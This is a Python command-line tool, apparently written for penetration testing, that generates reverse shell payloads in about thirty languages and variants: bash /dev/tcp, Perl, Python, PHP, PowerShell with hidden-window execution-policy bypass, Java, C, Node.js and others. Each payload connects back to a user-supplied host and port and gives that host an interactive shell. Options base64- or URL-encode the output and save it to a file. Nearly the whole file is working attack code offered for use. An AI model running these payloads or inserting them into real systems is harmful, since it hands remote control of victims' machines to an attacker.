#!/usr/bin/env python3

# Made with hatred and vengence by MuhammadMuazen // Just kidding ;>
# My github: https://github.com/MuhammadMuazen
# Payloads from: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

# If you want to add your reverse shell here are the steps:
# 1) add the name that should be referenced in the command line in the list: avalible_payloads
# 2) (optinal) add the name to the help message in the table
# 3) write the function that holds the shell then in the function call the handle_payload_output function
# 4) add your function to the if conditions in the handle_payload_generator function
# 5) Good luck in your journy!

import urllib.parse
import base64
import sys
import os
import re

#This list have all the avalible reverse shells names 
avalible_payloads = ['bash-tcp', 'bash-udp', 'perl-linux', 'perl-win', 'py3-win', 'py2-win', 'py3-linux',
                    'php-exec', 'php', 'php-shellexec', 'php-system', 'php-passthru', 'php-popen',
                    'ruby-linux', 'ruby-win', 'rust', 'go', 'powershell', 'awk', 'java-linux', 'java-thread-lin',
                    'java-win', 'java-thread-win', 'lua-linux', 'lua-win', 'nodejs-win', 'nodejs-linux', 
                    'groovy', 'c', 'dart']

def help_message():
        print(f'''[+] Usage: {os.path.basename(__file__)} -lh <LHOST IP> -lp <LPORT> -t <reverse shell type> [-options]\n
        options:
                -h                  help for this script
                -o string           output to file to write result to
                -e <base64, url>    encode the payload in base64 OR URL encoding
                
                -t <shell type>

    _______________________            
   (_O_O_O_O_O_O_O_O_O_O_O_)         _______________________________
    \/___________________\/         |                               |
    |_____________________|         |        avalible types         |
    | |                 | |         |_______________________________|
    | | rshellgen By:   | |         |               |               |
    | |                 | |         | bash-tcp      | bash-udp      |
    | |_MuhammadMuazen__| |         | perl-linux    | perl-win      |
    |/___________________\|         | py3-win       | py2-win       |
                                    | py3-linux     | php-exec (php)|
                                    | php-shellexec | php-system    |
                                    | php-passthru  | php-popen     |
                                    | ruby-linux    | ruby-win      |
                                    | rust          | go            |
                                    | powershell    | awk           |
                                    | java-linux    |java-thread-lin|
                                    | java-win      |java-thread-win|
                                    | lua-linux     | lua-win       |
                                    | nodejs-win    | nodejs-linux  |
                                    | c             | dart          |
                                    |_______________|_______________|

[+] Example: {os.path.basename(__file__)} -lh 192.168.1.2 -lp 4444 -t bash-tcp -e base64 -o reverse-shell.sh''')


#function to check if the parameter is valid ip address
#input: ip --> which is the local host ip address
#output: if the parameter is valid ip? 1 : 0
def is_valid_ip(ip):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return bool(ip_pattern.match(ip))

#function to base64 encode the parameter rev_shell
#input: the rev_shell --> which is the reverse shell
#output: base64 encoded rev_shell --> base_64_rev_shell
def base64_encode(rev_shell):
    rev_shell_bytes = rev_shell.encode('ascii')
    base64_rev_shell_bytes = base64.b64encode(rev_shell_bytes)
    base_64_rev_shell = base64_rev_shell_bytes.decode('ascii')
    return base_64_rev_shell

#funuction to url encode the parameter rev_shell
#input: the rev_shell --> which is the reverse shell
#output: url encoded rev_shell --> url_encoded_rev_shell
def url_encode(rev_shell):
    url_encoded_rev_shell = urllib.parse.quote(rev_shell)
    return url_encoded_rev_shell

#funtion that export the shell to a file
#input rev_shell and output_file_name
#output --> string that tells where the file is saved
def export_to_file(rev_shell, output_file_name):
    file_path = f'./{output_file_name}'
    try:
        with open(file_path, 'w') as rev_shell_file:
            rev_shell_file.write(rev_shell)
            print(f'[+] Saved in file: {os.path.abspath(file_path)}')
    except Exception as e:
        print(f'[-] Error saving to a file: {e}')

#function to handle the output of the reverse shell and prints it
#input: shell, output_file_name and encoding_algo
#if output_file_name != None and encoding_algo != None --> print encoded shell and output it to a file
#elif output_file_name != None and encoding_algo == None --> output it to a file
#else output_file_name == None and encoding_algo != None --> print encoded shell
def handle_payload_output(shell, output_file_name, encoding_algo):
    print('[+] The shell is: ')
    print(shell, end='\n\n')
    try:
        if(encoding_algo == 'url'):
            url_encd_shell = url_encode(shell)
            print('[+]The encoded shell is: ')
            print(url_encd_shell, end='\n\n')
            if(output_file_name):
                export_to_file(url_encd_shell, output_file_name)
        elif(encoding_algo == 'base64'):
            base64_encd_shell = base64_encode(shell)
            print('[+]The encoded shell is: ')
            print(base64_encd_shell, end='\n\n')
            if(output_file_name):
                export_to_file(base64_encd_shell, output_file_name)
        elif((not encoding_algo) and output_file_name):
            export_to_file(shell, output_file_name)
    except Exception as e:
        print(f'[-]Error in handling the payload output: {e}')

#function to check for the name of the java class in the java reverse shells
#input: output_file_name
#output: if output_file_name = None --> RevShell
#        elif out_file_name have '.' in it --> name of the file with capital first letter without the dot
#        elif out_file_name don't have '.' --> name of the file with capital first letter
def check_class_name(output_file_name):
    if output_file_name:
        if('.' in output_file_name):
            return str(output_file_name[:output_file_name.index('.')].capitalize())
        else:
            return output_file_name.capitalize()
    else:
        return 'RevShell'

def bash_tcp(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f'bash -i >& /dev/tcp/{lhost_ip}/{lport} 0>&1'
    handle_payload_output(shell, output_file_name, encoding_algo)

def bash_udp(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f'bash -i >& /dev/udp/{lhost_ip}/{lport} 0>&1'
    handle_payload_output(shell, output_file_name, encoding_algo)

def perl_linux(lhost_ip, lport, output_file_name, encoding_algo):
    shell = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");\
exec("/bin/sh -i");}};'""".format(lhost_ip, lport)
    handle_payload_output(shell, output_file_name, encoding_algo)

def perl_win(lhost_ip, lport, output_file_name, encoding_algo):
    shell = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{0}:{1}\");\
STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;".format(lhost_ip, lport)
    handle_payload_output(shell, output_file_name, encoding_algo)

def py3_win(lhost_ip, lport, output_file_name, encoding_algo):
    shell = 'python.exe -c "import socket,os,threading,subprocess as sp;\
p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();\
s.connect((\'{0}\',{1}));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);\
s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);\
os.write(p.stdin.fileno(),i)\",globals())).start()"'.format(lhost_ip, lport)
    handle_payload_output(shell, output_file_name, encoding_algo)

def py2_win(lhost_ip, lport, output_file_name, encoding_algo):
    shell = (
    "python.exe -c \"(lambda __y, __g, __contextlib: "
    f"[[[[[[[(s.connect(('{lhost_ip}', {lport})), "
    "[[[(s2p_thread.start(), "
    "[[(p2s_thread.start(), (lambda __out: "
    "(lambda __ctx: [__ctx.__enter__(), "
    "__ctx.__exit__(None, None, None), "
    "__out[0](lambda: None)][2])"
    "(\\\"__contextlib.nested("
    "type('except', (), {'__enter__': lambda self: None, "
    "'__exit__': lambda __self, __exctype, __value, __traceback: "
    "__exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and "
    "[True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}), "
    "type('try', (), {'__enter__': lambda self: None, "
    "'__exit__': lambda __self, __exctype, __value, __traceback: "
    "[False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})"
    "\\\")))([None]))[1] for p2s_thread.daemon in [(True)]][0] "
    "for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] "
    "for s2p_thread.daemon in [(True)]][0] "
    "for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] "
    "for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], "
    "stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] "
    "for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] "
    "for __g['p2s'], p2s.__name__ in [(lambda s, p: "
    "(lambda __l: [(lambda __after: __y(lambda __this: lambda: "
    "(__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) "
    "for __l['s'], __l['p'] in [(s, p)]][0])({}, 'p2s')]][0] "
    "for __g['s2p'], s2p.__name__ in [(lambda s, p: "
    "(lambda __l: [(lambda __after: __y(lambda __this: lambda: "
    "[(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) "
    "for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) "
    "for __l['s'], __l['p'] in [(s, p)]][0])({}, 's2p')]][0] "
    "for __g['os'] in [(__import__('os', __g, __g))]][0] "
    "for __g['socket'] in [(__import__('socket', __g, __g))]][0] "
    "for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] "
    "for __g['threading'] in [(__import__('threading', __g, __g))]][0])"
    "(\\\"(lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), "
    "globals(), __import__('contextlib'))\\\"\"")
    handle_payload_output(shell, output_file_name, encoding_algo)

def py3_linux(lhost_ip, lport, output_file_name, encoding_algo):    
    shell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
s.connect(("{lhost_ip}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\
subprocess.call(["/bin/sh","-i"])'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def php_exec(lhost_ip, lport, output_file_name, encoding_algo) :
    shell = f"""php -r '$sock=fsockopen("{lhost_ip}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def php_shellexec(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""php -r '$sock=fsockopen("{lhost_ip}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def php_system(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""php -r '$sock=fsockopen("{lhost_ip}",{lport});system("/bin/sh -i <&3 >&3 2>&3");'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def php_passthru(lhost_ip , lport, output_file_name, encoding_algo):
    shell = f"""php -r '$sock=fsockopen("{lhost_ip}",{lport});passthru("/bin/sh -i <&3 >&3 2>&3");'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def php_popen(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""php -r '$sock=fsockopen("{lhost_ip}",{lport});popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def ruby_linux(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""ruby -rsocket -e'f=TCPSocket.open("{lhost_ip}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def ruby_win(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""ruby -rsocket -e 'c=TCPSocket.new("{lhost_ip}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r")\
{{|io|c.print io.read}}end'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def rust_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = "use std::net::TcpStream;\n"
    shell += "use std::os::unix::io::{AsRawFd, FromRawFd};\n"
    shell += "use std::process::{Command, Stdio};\n\n"
    shell += "fn main() {\n"
    shell += f'let s = TcpStream::connect("{lhost_ip}:{lport}").unwrap();\n'
    shell += "let fd = s.as_raw_fd();\n"
    shell += 'Command::new("/bin/sh")\n'
    shell += '\t.arg("-i")\n'
    shell += '\t.stdin(unsafe { Stdio::from_raw_fd(fd) })\n'
    shell += '\t.stdout(unsafe { Stdio::from_raw_fd(fd) })\n'
    shell += '\t.stderr(unsafe { Stdio::from_raw_fd(fd) })\n'
    shell += '\t.spawn()\n\t.unwrap()\n\t.wait()\n\t.unwrap();\n}'
    handle_payload_output(shell, output_file_name, encoding_algo)

def go_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost_ip}:{lport}");\
cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' \
> /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def powershell_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object \
System.Net.Sockets.TCPClient("{lhost_ip}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};\
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding)\
.GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );\
$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def awk_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""awk 'BEGIN {{s = "/inet/tcp/0/{lhost_ip}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; \
if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def java_linux_shell(lhost_ip, lport, output_file_name, encoding_algo):
    class_name =  check_class_name(output_file_name)
    shell = f"public class {class_name} {{\n"
    shell += '\tpublic static void main(String[] args) {\n'
    shell += '\t\tRuntime r = Runtime.getRuntime();\n\t\t'
    shell += f"""Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{lhost_ip}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'");"""
    shell += "\n\t\tp.waitFor();\n\t}\n}"
    handle_payload_output(shell, output_file_name, encoding_algo)

def java_win_shell(lhost_ip, lport, output_file_name, encoding_algo):
    class_name = check_class_name(output_file_name)
    shell = f"public class {class_name} {{"
    shell += '\n\tpublic static void main(String[] args) {\n'
    shell += f'\t\tString host="{lhost_ip}";\n'
    shell += f'\t\tint port={lport};\n'
    shell += f'\t\tString cmd="cmd.exe";\n'
    shell += f"""\t\tProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);\
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())\
{{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());\
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try \
{{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();\n"""
    shell += '\t}\n}'
    handle_payload_output(shell, output_file_name, encoding_algo)

def java_thread_linux_shell(lhost_ip, lport, output_file_name, encoding_algo):
    class_name = check_class_name(output_file_name)
    shell = f"public class {class_name} {{"
    shell += '\n\tpublic static void main(String[] args) {\n'
    shell += '\t\tThread thread = new Thread(){\n'
    shell += '\t\t\tpublic void run(){\n'
    shell += '\t\t\t\tRuntime r = Runtime.getRuntime();\n\t\t\t\t'
    shell += f"""Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{lhost_ip}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'");"""
    shell += "\n\t\t\t\tp.waitFor();\n\t\t\t}\n\t\t}\n\t}\n}"
    handle_payload_output(shell, output_file_name, encoding_algo)

def java_thread_win_shell(lhost_ip, lport, output_file_name, encoding_algo):
    class_name = check_class_name(output_file_name)
    shell = f"public class {class_name} {{"
    shell += '\n\tpublic static void main(String[] args) {\n'
    shell += '\t\tThread thread = new Thread(){\n'
    shell += '\t\t\tpublic void run(){\n'
    shell += f'\t\t\t\tString host="{lhost_ip}";\n'
    shell += f'\t\t\t\tint port={lport};\n'
    shell += f'\t\t\t\tString cmd="cmd.exe";\n\t\t\t\t'
    shell += f"""Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);\
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())\
{{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());\
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try \
{{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();\n"""
    shell += "\n\t\t\t}\n\t\t}\n\t}\n}"
    handle_payload_output(shell, output_file_name, encoding_algo)

def lua_linux_shell(lhost_ip , lport, output_file_name, encoding_algo):
    shell = f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost_ip}','{lport}');\
os.execute('/bin/sh -i <&3 >&3 2>&3');\""""
    handle_payload_output(shell, output_file_name, encoding_algo)

def lua_win_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = f"""lua5.1 -e 'local host, port = "{lhost_ip}", {lport} local socket = require("socket") \
local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do \
local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() \
tcp:send(s) if status == "closed" then break end end tcp:close()'"""
    handle_payload_output(shell, output_file_name, encoding_algo)

def nodejs_linux_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = "(function(){\n"
    shell += '\tvar net = require("net"),\n'
    shell += '\t\tcp = require("child_process"),\n'
    shell += '\t\tsh = cp.spawn("/bin/sh", []);\n'
    shell += '\tvar client = new net.Socket();\n'
    shell += f'\tclient.connect({lport}, "{lhost_ip}", function(){{\n'
    shell += '\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});'
    shell += '\n\treturn /a/;\n})();'
    handle_payload_output(shell, output_file_name, encoding_algo)

def nodejs_win_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = "(function(){\n"
    shell += '\tvar net = require("net"),\n'
    shell += '\t\tcp = require("child_process"),\n'
    shell += '\t\tsh = cp.spawn("cmd.exe", []);\n'
    shell += '\tvar client = new net.Socket();\n'
    shell += f'\tclient.connect({lport}, "{lhost_ip}", function(){{\n'
    shell += '\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});'
    shell += '\n\treturn /a/;\n})();'
    handle_payload_output(shell, output_file_name, encoding_algo)

def c_reverse_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = '#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n'
    shell += '#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\n'
    shell += 'int main(void){\n'
    shell += f'\tint port = {lport};\n\tstruct sockaddr_in revsockaddr;\n\n'
    shell += '\tint sockt = socket(AF_INET, SOCK_STREAM, 0);\n\trevsockaddr.sin_family = AF_INET;\n'
    shell += '\trevsockaddr.sin_port = htons(port);\n'
    shell += f'\trevsockaddr.sin_addr.s_addr = inet_addr("{lhost_ip}");\n\n'
    shell += '\tconnect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n'
    shell += '\tdup2(sockt, 0);\n\tdup2(sockt, 1);\n\tdup2(sockt, 2);\n\n'
    shell += '\tchar * const argv[] = {"/bin/sh", NULL};\n\texecve("/bin/sh", argv, NULL);\n\treturn 0;\n}'
    handle_payload_output(shell, output_file_name, encoding_algo)

def dart_reverse_shell(lhost_ip, lport, output_file_name, encoding_algo):
    shell = "import 'dart:io';\nimport 'dart:convert';\n\n"
    shell += 'main() {\n'
    shell += f'\tSocket.connect("{lhost_ip}", {lport}).then((socket) {{\n'
    shell += '\t\tsocket.listen((data) {\n'
    shell += "\t\t\tProcess.start('powershell.exe', []).then((Process process) {\n"
    shell += '\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());\n'
    shell += '\t\t\t\tprocess.stdout\n\t\t\t\t\t.transform(utf8.decoder)\n\t\t\t\t\t'
    shell += '.listen((output) { socket.write(output); });\n\t\t\t});\n\t\t},\n\t\tonDone: () {\n'
    shell += '\t\t\tsocket.destroy();\n\t\t});\n\t});\n}'
    handle_payload_output(shell, output_file_name, encoding_algo)

#function that proccess the shell type name and call the specified shell type
#input: lhost, lport, output_file_name, encoding_algo --> passed to the shell type function
#       rev_shell_type --> specify the shell type and pass it to the if condition
#output: calls the reverse shell function that have been choosen
def handle_payload_generator(lhost_ip, lport, rev_shell_type, output_file_name = None, encoding_algo = None):
    if(rev_shell_type == 'bash-tcp'):
        bash_tcp(lhost_ip , lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'bash-udp'):
        bash_udp(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'perl-linux'):
        perl_linux(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'perl-win'):
        perl_win(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'py3-win'):
        py3_win(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'py2-win'):
        py2_win(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'py3-linux'):
        py3_linux(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'php-exec' or rev_shell_type == 'php'):
        php_exec(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'php-shellexec'):
        php_shellexec(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'php-system'):
        php_system(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'php-passthru'):
        php_passthru(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'php-popen'):
        php_popen(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'ruby-linux'):
        ruby_linux(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'ruby-win'):
        ruby_win(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'rust'):
        rust_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'go'):
        go_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'powershell'):
        powershell_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'awk'):
        awk_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'java-linux'):
        java_linux_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'java-win'):
        java_win_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'java-thread-lin'):
        java_thread_linux_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'java-thread-win'):
        java_thread_win_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'lua-linux'):
        lua_linux_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'lua-win'):
        lua_win_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'nodejs-linux'):
        nodejs_linux_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'nodejs-win'):
        nodejs_win_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'c'):
        c_reverse_shell(lhost_ip, lport, output_file_name, encoding_algo)
    elif(rev_shell_type == 'dart'):
        dart_reverse_shell(lhost_ip, lport, output_file_name, encoding_algo)

if __name__ == '__main__':
    if ('-h' in sys.argv) or ('-lh' not in sys.argv) or ('-lp' not in sys.argv) or ('-t' not in sys.argv):
        help_message()
        exit(-1)
    try:
        #remove all the spaces from the arguments
        parameters = [i.strip(' ') for i in sys.argv[1:]]

        #get the local host ip and check if valid
        if(is_valid_ip(parameters[parameters.index('-lh') + 1])):
            lhost_ip = parameters[parameters.index('-lh') + 1]

        #get the local port and check if valid
        if(parameters[parameters.index('-lp') + 1].isdigit()):
            lport = parameters[parameters.index('-lp') + 1]

        #get the payload type and check if valid
        if(parameters[parameters.index('-t') + 1] in avalible_payloads):
            rev_shell_type = parameters[parameters.index('-t') + 1]

        output_file_name = None
        encoding_algo = None    
        
        #check if output file is specified
        if('-o' in parameters):
            output_file_name = parameters[parameters.index('-o') + 1]

        #check if any encoding type is specified
        if('-e' in parameters):
            if(parameters[parameters.index('-e') + 1] not in ['base64', 'url']):
                print('[-]Invalid input!')
                print("\t-e <base64, url> encode the payload in base64 OR URL encoding")
                exit(-1)
            else:
                encoding_algo = parameters[parameters.index('-e') + 1]

        handle_payload_generator(lhost_ip, lport, rev_shell_type, output_file_name, encoding_algo)

    except Exception as e:
        print(f'[-]Error: {e}')
        help_message()  
